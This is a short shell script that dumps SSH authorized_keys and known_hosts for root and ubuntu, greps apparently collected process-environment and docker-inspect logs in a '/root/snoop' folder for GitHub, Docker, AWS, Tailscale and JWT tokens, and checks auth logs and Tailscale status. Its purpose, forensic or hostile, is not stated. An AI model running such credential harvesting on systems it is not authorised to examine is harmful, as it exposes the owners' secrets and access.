echo "=== auth-keys ==="
cat /root/.ssh/authorized_keys /home/ubuntu/.ssh/authorized_keys 2>&1
echo "=== known_hosts ==="
cat /root/.ssh/known_hosts 2>&1
echo "=== token-pattern hits in ps-env.log (dedup) ==="
grep -aoE "(tskey-[a-z]+-[A-Za-z0-9_-]+|ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|dckr_pat_[A-Za-z0-9_-]{27}|AKIA[A-Z0-9]{16}|eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,})" /root/snoop/ps-env.log 2>/dev/null | sort -u | head -40
echo "=== token-pattern hits in docker-inspects.jsonl (dedup) ==="
grep -aoE "(tskey-[a-z]+-[A-Za-z0-9_-]+|ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|dckr_pat_[A-Za-z0-9_-]{27}|AKIA[A-Z0-9]{16})" /root/snoop/docker-inspects.jsonl 2>/dev/null | sort -u | head -40
echo "=== auth-tail interesting ==="
grep -aE "Accepted|session opened" /root/snoop/auth-tail.log 2>/dev/null | tail -20
echo "=== caddywatch ==="
ls -la /root/ 2>/dev/null | head -30; cat /root/caddywatch* 2>/dev/null | tail -20
echo "=== tailscale ==="
tailscale status 2>&1 | head -25
